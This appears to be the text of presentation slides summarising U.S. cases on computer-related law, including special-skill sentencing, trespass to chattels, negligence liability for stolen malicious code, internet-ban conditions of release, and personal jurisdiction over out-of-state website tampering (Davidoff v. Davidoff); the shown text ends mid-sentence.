 United States v. Prochner, 417 F.3d 54 (D. Mass. 
July 22, 2005)
 Definition of Special Skills
 Special skill - a skill not possessed by members of the 
general public and usually requiring substantial 
education, training or licensing.
 Examples - pilots, lawyers, doctors, accountants, 
chemists, and demolition experts
 Not necessarily have formal education or training
 Acquired through experience or self-tutelage
 Critical question is - whether the skill set elevates to a 
level of knowledge and proficiency that eclipses that 
possessed by the general public.

 Self defense of personal property one must prove that 
he was in a place he had a right to be, that he acted 
without fault and that he used reasonable force
which he reasonably believed was necessary to 
immediately prevent or terminate the other person's 
trespass or interference with property lawfully in his 
possession 
 Moore v. State, 634 N.E.2d 825 (Ind. App. 1994) and
Pointer v. State, 585 N.E. 2d 33, 36 (Ind. App. 1992)
 Right to exclude people from one’s personal property 
is not unlimited.

 Common Law Doctrine-Trespass to Chattel
 Owner of personal property has a cause of action for 
trespass and may recover only the actual damages 
suffered by reason of the impairment of the property 
or the loss of its use
 One may use reasonable force to protect his 
possession against even harmless interference
 The law favors prevention over post-trespass 
recovery, as it is permissible to use reasonable force 
to retain possession of a chattel but not to recover it 
after possession has been lost

 Hoblyn v. Johnson, 2002 WY 152, 2002 Wyo. LEXIS 
173 (Wyo., October 9, 2002, Decided) 
 One is privileged to enter land in the possession of another, 
at a reasonable time and in a reasonable manner, for the 
purpose of removing a chattel to the immediate 
possession of which the actor is entitled, and which has 
come upon the land otherwise than with the actor's consent 
or by his tortious conduct or contributory negligence.
This privilege is limited to those situations where the actor, 
as against all persons, is entitled to immediate possession 
of the chattel both at the time when the chattel is placed on 
the land and when the actor seeks to enter and reclaim it.

 Universal Tube & Rollform Equipment Corp., v 
YouTube, In., et al., 2007 WL 1655507 (N.D. Ohio.  
June 4, 2007)
 Lanham Act- Protectable Mark
Lanham Act provides a cause of action for infringement of a mark that has not been 
federally registered. Courts must determine whether the mark is protectable, and if 
so, whether there is a likelihood of confusion as a result of the would-be infringer's 
use of the mark. Court allows claim to go forward
 Trespass to Chattel
Trespass to chattel claim, although it involves something as amorphous as “the 
internet,” must still maintain some link to a physical object-in that case, a computer.
Domain name is an intangible object, much like a street address or a telephone 
number, which, though it may ultimately point to an approximate or precise 
physical location, is without physical substance, and it is therefore impossible to 
make “physical contact” with it. Universal's only hope of succeeding on its 
trespass to chattels claim, therefore, rests on its ability to show a link to a physical 
object.  Universal entered contract w/ third party for website, so no interest in 
host’s computers.  Moreover, YouTube did not make physical contact with 
computers hosting website, mistaken visitors did.

Liability for Stolen Malicious Code
 Negligence
 (1) defendant had a duty to the plaintiff; 
 (2) defendant failed to perform that duty; and, 
 (3) defendant's breach was the proximate 
cause of the plaintiff's injury
 Item Causing the Harm
 Firearms are inherently dangerous, and those 
who own and control firearms should be 
required to exercise the highest degree of care
Liability for Stolen Malicious Code
 Negligence
 Minimum causation requirement is the "but for" 
test - accident would not have happened but for 
the act or omission.  Many opinions place 
emphasis on foreseeability.
 Courts show great reluctance to find liability if 
the chain of causation includes a series of 
events, subsequent to the initial act or omission, 
over which the defendant has absolutely no 
control - "intervening cause" 
Liability for Stolen Malicious Code
 Negligence
 The defendant is not invariably excused from liability when the 
chain of causation includes a criminal act.
 The overwhelming weight of authority holds that the owner of 
an automobile who parks the car in a public area with the keys 
in the ignition is not liable to a motorist or a pedestrian injured 
by the negligent driving of a thief who has an accident after 
stealing the car. See Ford v. Monroe, 559 S.W.2d 759 (Mo. App. 
1977).

(3d Cir. W.D. Penn. June 5, 2007) 
 Condition must be “reasonably related” to the factors 
set forth in 18 U.S.C. § 3553(a). Those factors include: 
“(1) the nature and circumstances of the offense and the 
history and characteristics of the defendant; [and] (2) the 
need for the sentence imposed . . . (B) to afford adequate 
deterrence to criminal conduct; (C) to protect the public 
from further crimes of the defendant; and (D) to provide 
the defendant with needed educational or vocational 
training, medical care, or other correctional treatment in 
the most effective manner.” 18 U.S.C. § 3553(a). Any 
such condition must impose “no greater deprivation of 
liberty than is reasonably necessary” to deter future 
criminal conduct, protect the public, and rehabilitate the 
defendant

 PROHIBITION OF COMPUTER EQUIPMENT AND THE 
INTERNET 
 Voelker contends that an absolute lifetime ban on using computers 
and computer equipment as well as accessing the internet, with no 
exception for employment or education, involves a greater 
deprivation of liberty than is reasonably necessary and is not 
reasonably related to the factors set forth in 18 U.S.C. § 3583. We 
agree.

 Davidoff v. Davidoff, 2006 N.Y. Misc. LEXIS 1307 (NY 
Sp Ct May 10, 2006)
 Plaintiff sued for destruction of personal property, defamation,
intentional infliction of emotional distress, tortious interference 
with a business, computer trespass, and computer tampering.
 On February 20, 2005, the defendants, his uncle and aunt, 
without permission or authority, entered the Website from 
their home computer in Florida, deleted all of the files on the 
Website, and placed their own picture of the plaintiff on the 
Website, with phrases such as "Pig of the Year," and "I'm 
going to eat everything in site," next to the plaintiff's picture.
 Davidoff v. Davidoff, 2006 N.Y. Misc. LEXIS 1307 (NY 
Sp Ct May 10, 2006)
 Defendants contend the Court lacks jurisdiction over them since 
defendants do not reside in New York, have not consented to 
service of process in New York, are not "doing business" in New 
York, and have no offices or employees in New York 
 Defendants also contend that jurisdiction is lacking given that they 
have not transacted business in New York, and have had no 
contacts with New York sufficient to establish that they 
purposefully availed themselves of the privileges of conducting 
business in New York.
 The defendants also maintain that a New York court may not exert
personal jurisdiction over them since the defendants have not 
committed a tortious act within the state.

 Davidoff v. Davidoff, 2006 N.Y. Misc. LEXIS 1307 (NY 
Sp Ct May 10, 2006)
 Plaintiff alleges that the Court has personal jurisdiction over the 
defendants. Plaintiff points out that Courts have held that in this 
age of instant communications via telephone, facsimile and the 
internet, physical presence of the defendants in New York is not
required for a finding of a tortious act within the state. Plaintiff 
notes that the court should place emphasis on the locus of the tort, 
not physical presence, when determining a jurisdictional issue. 
Plaintiff submits that New York was the locus of  the alleged 
tortious act since the plaintiff's computer is located within New 
York, and the content of plaintiff's Website originated from 
plaintiff's computer in New York. Therefore, plaintiff argues, it is 
"wholly immaterial" that the plaintiff's Website was hosted by a
Florida internet server.

 The extent a court may exercise personal jurisdiction over a 
nondomiciliary without violating the Due Process Clause of the 
Constitution was defined in the Supreme Court's opinion in 
International Shoe Co. v Washington (326 U.S. 310, 66 S. Ct. 
154, 90 L. Ed. 95 [1945]). In order to subject a defendant to a 
judgment in personam, "if he be not present within the territory of 
the forum, he must have certain minimum contacts with the forum 
state such that the "maintenance of the suit does not offend 
traditional notions of fair play and substantial justice." 
(International Shoe Co. v State of Wash., supra at 316;World-Wide 
Volkswagen Corp. v Woodson, 444 U.S. 286, 100 S. Ct. 559, 62 L. 
Ed. 2d 490 [1980]; see also Indosuez International Finance B.V. v

 Davidoff v. Davidoff, 2006 N.Y. Misc. LEXIS 1307 (NY 
Sp Ct May 10, 2006)
 The issue is whether this Court may exercise personal jurisdiction 
over the defendants where defendants, though not physically 
present in New York, allegedly commit tortious acts on an internet 
website created by plaintiff, thereby injuring plaintiff in New York. 
Plaintiff maintains that the defendants need not be physically
